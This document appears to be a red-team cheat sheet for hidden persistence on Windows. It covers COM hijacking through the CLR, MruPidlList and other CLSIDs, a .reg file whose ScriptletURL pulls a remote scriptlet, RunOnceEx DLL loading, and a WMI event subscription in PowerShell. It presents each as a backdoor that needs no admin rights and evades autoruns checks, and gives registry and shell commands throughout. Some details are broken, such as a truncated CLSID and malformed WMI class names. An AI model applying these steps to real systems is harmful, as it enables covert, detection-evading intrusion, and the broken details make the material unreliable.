### CLR Injection via COM Hijacking

#### Overview
CLR (Common Language Runtime) injection through COM (Component Object Model) hijacking is a technique that allows the execution of arbitrary .NET code without requiring administrative privileges. This method can be used to establish a persistent backdoor on a system. However, setting environment variables via WMI (Windows Management Instrumentation) requires a system restart.

#### POC
- **GitHub Repository**: [https://github.com/3gstudent/CLR-Injection](https://github.com/3gstudent/CLR-Injection)

#### Steps to Execute the POC
1. **Batch Script Execution**:
   - Run the provided batch script.
   - After running the script, either log off or restart the server.
   - Two DLL files will be left in the directory where the script was executed.

2. **Registry Modification**:
   - Use the `REG.EXE` command to add the necessary registry entries.
   - Example commands:
     ```cmd
     REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
     REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D "Apartment" /F
     ```

#### CAccPropServicesClass & MMDeviceEnumerator
- **Backdoor Mechanism**:
  - Similar to the CLR injection method, but does not require a system restart.
  - No administrative privileges are needed.
  - Bypasses detection by autorun startup item checks.

### COM Object Hijacking for Persistence

#### 32-bit System
1. **Create the DLL File**:
   - Place the backdoor DLL in the following path:
     ```
     %APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-579291692E}\
     ```
   - Name the DLL file according to the pattern:
     ```
     API-MS-WIN-downlevel-<4char_random>-l1-1-0._dl
     ```

2. **Modify the Registry**:
   - **Registry Path**: `HKEY_CURRENT_USER\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`
   - **Subkey**: `InprocServer32`
   - **Default Value**: Absolute path to the 32-bit DLL.
   - **Additional Key**: `ThreadingModel | REG_SZ | Apartment`

3. **Execution**:
   - When any application that loads the specified COM object is launched, the DLL will be executed.

#### 64-bit System
1. **Create the DLL File**:
   - Place the backdoor DLL in the same path as the 32-bit system.
   - Follow the same naming convention for the DLL file.

2. **Modify the Registry**:
   - **Registry Path 1**: `HKEY_CURRENT_USER\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`
     - **Subkey**: `InprocServer32`
     - **Default Value**: Absolute path to the 64-bit DLL.
     - **Additional Key**: `ThreadingModel | REG_SZ | Apartment`
   - **Registry Path 2**: `HKEY_CURRENT_USER\Software\Classes\Wow6432Node\CLSID\{BCDE0395-E52F-467C-8E3D-579291692E}`
     - **Subkey**: `InprocServer32`
     - **Default Value**: Absolute path to the 32-bit DLL.
     - **Additional Key**: `ThreadingModel | REG_SZ | Apartment`

3. **Execution**:
   - The DLL will be executed when an application that loads the specified COM object is launched.

#### MruPidlList
- **Backdoor Mechanism**:
  - Unlike the previous methods, this is an active backdoor.
  - **Registry Path**: `HKEY_CURRENT_USER\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}`
  - **Subkey**: `InprocServer32`
  - **Default Value**: Absolute path to the DLL.
  - **Additional Key**: `ThreadingModel | REG_SZ | Apartment`
  - **Trigger**: When the system starts, `explorer.exe` calls `shell32.dll`, which in turn loads the MruPidlList COM object, executing the backdoor.

#### winlogon_regedit
- **Description**:
  - COM objects can be hijacked to insert malicious code and achieve persistence.
  - **Registry Changes**:
    - Modify the registry to replace legitimate COM references with malicious ones.
    - **Example**:
      ```reg
      Windows Registry Editor Version 5.00
      [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]
      @="AtomicRedTeam"
      [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00\CLSID]
      @="{00000001-0000-0000-0000-0000FEEDACDC}"

      [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]
      @="AtomicRedTeam"
      [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]
      @="{00000001-0000-0000-0000-0000FEEDACDC}"

      [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]
      @="AtomicRedTeam"
      [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]
      @="C:\\WINDOWS\\system32\\scrobj.dll"
      "ThreadingModel"="Apartment"

      [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]
      @="AtomicRedTeam.1.00"

      [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]
      @="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"

      [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]
      @="AtomicRedTeam"

      [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{06DA0625-9701-43DA-BFD7-FBEEA2180A1E}\TreatAs]
      @="{00000001-0000-0000-0000-0000FEEDACDC}"
      ```

### Image File Execution Options (IFEO) for cmd

- **Description**:
  - Malicious code can use IFEO to redirect the execution of certain programs to a different executable, such as `svchost.exe`.
  - **References**:
    - [Java Adwind RAT Uses Image File](https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-uses-image-file.html?utmcampaign=crowdfire&utmcontent=crowdfire&utmmedium=social&utmsource=twitter#2362224631-tw#1515608604431)
    - [Video Content](http://www.ggsec.cn/Image-File-Execution-Options-cmd.html)

### RunOnceEx for Persistence

- **Description**:
  - A technique to execute a DLL file without being detected by `autoruns.exe` during login.
  - **Command**:
    ```cmd
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Users\demon\mbox.dll"
    ```
  - **Trigger**:
    - The DLL will start on the next login, or you can run the following command to trigger it immediately:
      ```cmd
      runonce /Explorer
      ```
  - **References**:
    - [Oddvar Moe's Blog Post](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
    - [Microsoft Support Article](https://support.microsoft.com/en-us/help/310593/description-of-the-runonceex-registry-key)
    - [Video Content](http://www.ggsec.cn/RunOnceEx.html)

### WMI (Windows Management Instrumentation)

- **Overview**:
  - WMI is a powerful set of tools for managing local and remote Windows systems.
  - **References**:
    - [FireEye WMI Whitepaper](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)
    - [WMI Attack, Defense, and Forensic Analysis](http://drops.xmd5.com/static/drops/tips-8189.html)
    - [WMI Backdoor](http://drops.xmd5.com/static/drops/tips-8260.html)
    - [WMI Defense](http://drops.xmd5.com/static/drops/tips-8290.html)

- **Characteristics**:
  - Does not leave any files on the client or server.
  - Stores data in a complex database (`objects.data`).
  - Does not modify the registry.
  - Can be implemented using PowerShell.

- **PowerShell Commands**:
  - **Create a Static Class**:
    ```powershell
    $StaticClass = New-Object Management.ManagementClass('root\cimv2', $null, $null)
    $StaticClass.Name = 'Win32_EvilClass'
    $StaticClass.Put()
    $StaticClass.Properties.Add('EvilProperty', "This is the payload")
    $StaticClass.Put()
    ```

- **Schedule a Program to Run Every 60 Seconds**:
  ```powershell
  $filterName = 'BotFilter82'
  $consumerName = 'BotConsumer23'
  $exePath = 'C:\Windows\System32\notepad.exe'
  $Query = "SELECT * FROM InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  $WMIEventFilter = Set-WmiInstance -Class EventFilter -Namespace "root\subscription" -Arguments @{Name = $filterName; EventNameSpace = "root\cimv2"; QueryLanguage = "WQL"; Query = $Query} -ErrorAction Stop
  $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name = $consumerName; ExecutablePath = $exePath; CommandLineTemplate = $exePath}
  ```

- **Bind Filter and Consumer**:
  - Use the appropriate WMI methods to bind the filter and consumer.

This document provides a detailed overview of various techniques for achieving persistence on a Windows system using COM hijacking, WMI, and other methods. Each technique is described with the necessary steps and references for further reading.